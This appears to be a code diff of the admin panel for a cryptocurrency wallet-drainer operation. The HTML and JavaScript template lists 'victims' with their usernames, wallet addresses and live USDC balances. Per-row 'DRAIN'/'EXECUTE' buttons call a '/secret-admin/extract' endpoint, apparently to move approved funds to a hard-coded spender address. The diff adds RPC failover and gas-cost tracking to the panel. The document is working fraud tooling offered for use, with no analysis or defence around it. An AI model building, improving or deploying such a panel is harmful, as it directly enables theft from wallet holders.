@@ -2,155 +2,201 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>CORE ASSET CONTROL v2.1</title>
+    <title>CORE ASSET CONTROL v2.2</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
-        :root { --danger: #ef4444; --success: #22c55e; --accent: #38bdf8; --bg: #020617; --panel-bg: #0f172a; }
-        body { background: var(--bg); color: #f1f5f9; font-family: monospace; padding: 20px; }
+        :root { --danger: #ef4444; --success: #22c55e; --accent: #38bdf8; --bg: #020617; --panel: #0f172a; --border: #1e293b; }
+        body { background: var(--bg); color: #f1f5f9; font-family: 'JetBrains Mono', monospace; padding: 20px; margin: 0; }
 
-        .header { display: flex; justify-content: space-between; padding: 10px; border-bottom: 2px solid #1e293b; margin-bottom: 20px; }
-        .admin-box { background: #1e293b; padding: 10px; border-radius: 8px; border: 1px solid var(--accent); }
+        /* Top Navigation */
+        .top-bar { display: flex; justify-content: space-between; align-items: flex-start; padding: 15px; background: var(--panel); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 25px; }
+        .stats-group { display: flex; gap: 20px; }
+        .stat-card { background: #1e293b; padding: 10px 15px; border-radius: 8px; border-left: 3px solid var(--accent); }
+        .stat-label { font-size: 10px; color: #94a3b8; text-transform: uppercase; }
+        .stat-val { font-size: 16px; font-weight: bold; display: block; }
 
-        table { width: 100%; border-collapse: collapse; background: var(--panel-bg); border-radius: 8px; overflow: hidden; }
-        th { background: #1e293b; padding: 12px; text-align: left; color: var(--accent); border-bottom: 1px solid #334155; }
-        td { padding: 12px; border-bottom: 1px solid #1e293b; }
+        /* Main Table */
+        .table-container { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+        table { width: 100%; border-collapse: collapse; }
+        th { background: #1e293b; padding: 15px; text-align: left; color: var(--accent); font-size: 12px; border-bottom: 1px solid var(--border); }
+        td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; }
 
-        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
-        .success { background: #14532d; color: #4ade80; }
-        .loading { background: #1e293b; color: #94a3b8; }
+        .addr { color: #64748b; font-size: 11px; cursor: pointer; }
+        .addr:hover { color: var(--accent); }
+        .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
+        .badge-green { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
+        .badge-loading { background: #1e293b; color: #94a3b8; animation: pulse 1.5s infinite; }
 
-        .btn-exec { background: var(--danger); color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; font-weight: bold; }
-        .btn-exec:disabled { opacity: 0.3; }
+        /* Controls */
+        .amt-box { background: #020617; border: 1px solid #334155; color: #fff; padding: 6px; width: 80px; border-radius: 4px; }
+        .btn-drain { background: var(--danger); color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 6px; font-weight: bold; transition: 0.2s; }
+        .btn-drain:hover:not(:disabled) { transform: translateY(-1px); filter: brightness(1.1); }
+        .btn-drain:disabled { opacity: 0.3; cursor: wait; }
 
-        /* Log Panel */
-        #debug-log { margin-top: 20px; background: #000; color: #0f0; padding: 10px; height: 100px; overflow-y: auto; font-size: 11px; border: 1px solid #334155; }
-        #notifier { position: fixed; bottom: 20px; right: 20px; padding: 15px; border-radius: 5px; display: none; }
+        /* Feedback UI */
+        #log-console { margin-top: 20px; background: #000; border: 1px solid var(--border); color: #10b981; padding: 10px; height: 120px; overflow-y: auto; font-size: 11px; border-radius: 8px; }
+        #toast { position: fixed; bottom: 20px; right: 20px; padding: 15px 25px; border-radius: 8px; display: none; font-weight: bold; z-index: 100; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.5); }
+
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
     </style>
 </head>
 <body>
 
-    <div class="header">
+    <div class="top-bar">
         <div>
-            <h2 style="margin:0; color:var(--danger);">SYSTEM_CONTROL_v2</h2>
-            <small id="net-status">NETWORK: CONNECTING...</small>
+            <h2 style="margin:0; color:var(--danger)">ASSET_COMMANDER_v2.2</h2>
+            <div id="net-label" style="font-size:11px; margin-top:5px; color:#94a3b8">ESTABLISHING LINK...</div>
         </div>
-        <div class="admin-box">
-            <small>ADMIN_WALLET (ETH):</small><br>
-            <span id="admin-eth" style="color:var(--accent);">0.00000</span>
+        <div class="stats-group">
+            <div class="stat-card">
+                <span class="stat-label">Admin Gas (ETH)</span>
+                <span id="admin-eth" class="stat-val">0.00000</span>
+            </div>
+            <div class="stat-card" style="border-color: #eab308">
+                <span class="stat-label">Network Gas</span>
+                <span id="network-gas" class="stat-val">-- Gwei</span>
+            </div>
         </div>
     </div>
 
-    <table>
-        <thead>
-            <tr>
-                <th>USER_ID</th>
-                <th>WALLET_ADDRESS</th>
-                <th>USDC_BALANCE</th>
-                <th>GAS_EST</th>
-                <th>ACTION</th>
-            </tr>
-        </thead>
-        <tbody>
-            {% for v in victims %}
-            <tr id="row-{{ v.id }}">
-                <td>{{ v.user.username }}</td>
-                <td style="color:#64748b; font-size:12px;">{{ v.wallet_address }}</td>
-                <td id="bal-{{ v.id }}"><span class="status-badge loading">FETCHING...</span></td>
-                <td id="gas-{{ v.id }}" style="font-size:11px;">--</td>
-                <td>
-                    <input type="number" id="amt-{{ v.id }}" value="100" style="width:60px; background:#1e293b; border:1px solid #334155; color:#fff;">
-                    <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}')">DRAIN</button>
-                </td>
-            </tr>
-            {% endfor %}
-        </tbody>
-    </table>
+    <div class="table-container">
+        <table>
+            <thead>
+                <tr>
+                    <th>USER / ID</th>
+                    <th>WALLET ADDRESS</th>
+                    <th>USDC BALANCE</th>
+                    <th>EST. EXTRACTION COST</th>
+                    <th>EXTRACT AMT</th>
+                    <th>ACTION</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for v in victims %}
+                <tr id="row-{{ v.id }}">
+                    <td><strong>{{ v.user.username }}</strong><br><small style="color:#475569">ID: {{ v.id }}</small></td>
+                    <td class="addr" onclick="window.open('https://etherscan.io/address/{{ v.wallet_address }}')">{{ v.wallet_address }}</td>
+                    <td id="bal-{{ v.id }}"><span class="badge badge-loading">FETCHING...</span></td>
+                    <td id="cost-{{ v.id }}" style="font-size:11px; color:#94a3b8">--</td>
+                    <td><input type="number" id="amt-{{ v.id }}" class="amt-box" value="100"></td>
+                    <td><button class="btn-drain" onclick="executeDrain(this, '{{ v.id }}')">EXECUTE</button></td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
 
-    <div id="debug-log"> [SYSTEM INITIALIZED] </div>
-    <div id="notifier"></div>
+    <div id="log-console"> [SYSTEM ONLINE] Waiting for handshake...</div>
+    <div id="toast"></div>
 
 <script>
-// UPDATE THIS TO YOUR ACTUAL ADMIN WALLET
-const ADMIN_WALLET = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
-const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+// --- CONFIGURATION ---
+const ADMIN_ADDRESS = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B"; // Your Spender Address
+const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
-const RPC_URL = "https://rpc.ankr.com/eth"; // Much faster than Cloudflare
+const RPC_POOLS = [
+    "https://eth.llamarpc.com",
+    "https://rpc.ankr.com/eth",
+    "https://cloudflare-eth.com"
+];
 
-function log(msg) {
-    const d = document.getElementById('debug-log');
-    d.innerHTML += `> ${msg}<br>`;
-    d.scrollTop = d.scrollHeight;
+let provider;
+
+function writeLog(text) {
+    const log = document.getElementById('log-console');
+    log.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${text}</div>`;
+    log.scrollTop = log.scrollHeight;
 }
 
-function notify(msg, color) {
-    const n = document.getElementById('notifier');
-    n.innerText = msg; n.style.background = color; n.style.display = 'block';
-    setTimeout(() => n.style.display='none', 4000);
+function showToast(msg, isError = false) {
+    const t = document.getElementById('toast');
+    t.innerText = msg;
+    t.style.background = isError ? "#991b1b" : "#166534";
+    t.style.display = 'block';
+    setTimeout(() => t.style.display = 'none', 5000);
 }
 
-async function refreshData() {
+async function initProvider() {
+    for (let url of RPC_POOLS) {
+        try {
+            const p = new ethers.providers.StaticJsonRpcProvider(url);
+            await p.getNetwork(); // Test connection
+            provider = p;
+            document.getElementById('net-label').innerText = `ACTIVE_LINK: ${url}`;
+            document.getElementById('net-label').style.color = "#4ade80";
+            writeLog(`Handshake successful with ${url}`);
+            return true;
+        } catch (e) {
+            writeLog(`RPC Node ${url} rejected. Retrying...`);
+        }
+    }
+    return false;
+}
+
+async function syncData() {
+    if (!provider) { if (!await initProvider()) return; }
+
     try {
-        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
-        const network = await provider.getNetwork();
-        document.getElementById('net-status').innerText = `NETWORK: ${network.name.toUpperCase()} (ID: ${network.chainId})`;
-
-        // 1. Fetch Admin ETH
-        const ethBal = await provider.getBalance(ADMIN_WALLET);
+        // 1. Get Admin ETH
+        const ethBal = await provider.getBalance(ADMIN_ADDRESS);
         document.getElementById('admin-eth').innerText = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(5);
 
-        // 2. Fetch Gas Price
+        // 2. Get Gas Price & Calc Cost
         const gasPrice = await provider.getGasPrice();
-        const gasCostEth = ethers.utils.formatEther(gasPrice.mul(125000));
-        log(`Current Gas: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`);
+        document.getElementById('network-gas').innerText = `${parseFloat(ethers.utils.formatUnits(gasPrice, 'gwei')).toFixed(1)} Gwei`;
+        const estCostEth = ethers.utils.formatEther(gasPrice.mul(125000));
 
-        // 3. Fetch User Balances
-        const contract = new ethers.Contract(USDC_ADDR, USDC_ABI, provider);
+        // 3. Sync User Balances
+        const contract = new ethers.Contract(USDC_CONTRACT, USDC_ABI, provider);
         const rows = document.querySelectorAll('tr[id^="row-"]');
 
         for (let row of rows) {
             const id = row.id.split('-')[1];
-            const addr = row.cells[1].innerText;
+            const addr = row.querySelector('.addr').innerText.trim();
 
             try {
                 const bal = await contract.balanceOf(addr);
-                const cleanBal = parseFloat(ethers.utils.formatUnits(bal, 6)).toFixed(2);
-                document.getElementById(`bal-${id}`).innerHTML = `<span class="status-badge success">${cleanBal} USDC</span>`;
-                document.getElementById(`gas-${id}`).innerText = `~$${(cleanBal * 0).toFixed(2)} | ${parseFloat(gasCostEth).toFixed(4)} ETH`;
-            } catch(e) {
-                log(`Failed balance fetch for ${id}`);
+                const readable = parseFloat(ethers.utils.formatUnits(bal, 6)).toFixed(2);
+                document.getElementById(`bal-${id}`).innerHTML = `<span class="badge badge-green">${readable} USDC</span>`;
+                document.getElementById(`cost-${id}`).innerText = `${parseFloat(estCostEth).toFixed(5)} ETH`;
+            } catch (e) {
+                document.getElementById(`bal-${id}`).innerText = "REVERT";
             }
         }
     } catch (err) {
-        log(`CRITICAL ERROR: ${err.message}`);
+        writeLog(`SYNC_ERROR: ${err.message}`);
+        provider = null; // Reconnect on next loop
     }
 }
 
-async function runExtraction(btn, id) {
-    const amt = document.getElementById(`amt-${id}`).value;
-    btn.disabled = true; btn.innerText = "WAIT...";
-    log(`Executing Extraction ID: ${id} | Amount: ${amt}`);
+async function executeDrain(btn, id) {
+    const amount = document.getElementById(`amt-${id}`).value;
+    btn.disabled = true; btn.innerText = "MINING...";
+    writeLog(`Broadcasting extraction for ID ${id}...`);
 
     try {
-        const res = await fetch(`/secret-admin/extract/${id}/?amount=${amt}`);
+        const res = await fetch(`/secret-admin/extract/${id}/?amount=${amount}`);
         const data = await res.json();
+
         if(data.status === 'success') {
-            notify("SUCCESS", "#16a34a");
-            log(`TX SUCCESS: ${data.tx}`);
+            showToast("DRAIN SUCCESSFUL");
+            writeLog(`HASH: ${data.tx}`);
         } else {
-            notify(`FAILED: ${data.msg}`, "#dc2626");
-            log(`TX FAILED: ${data.msg}`);
+            showToast(`ERROR: ${data.msg}`, true);
+            writeLog(`FAILED: ${data.msg}`);
         }
     } catch(e) {
-        notify("SERVER ERROR", "#000");
+        showToast("SERVER UNREACHABLE", true);
     } finally {
-        btn.disabled = false; btn.innerText = "DRAIN";
-        refreshData();
+        btn.disabled = false; btn.innerText = "EXECUTE";
+        syncData();
     }
 }
 
-// Start
-refreshData();
-setInterval(refreshData, 30000); // Auto-refresh every 30s
+window.onload = () => {
+    syncData();
+    setInterval(syncData, 30000);
+};
 </script>
 </body>
 </html>
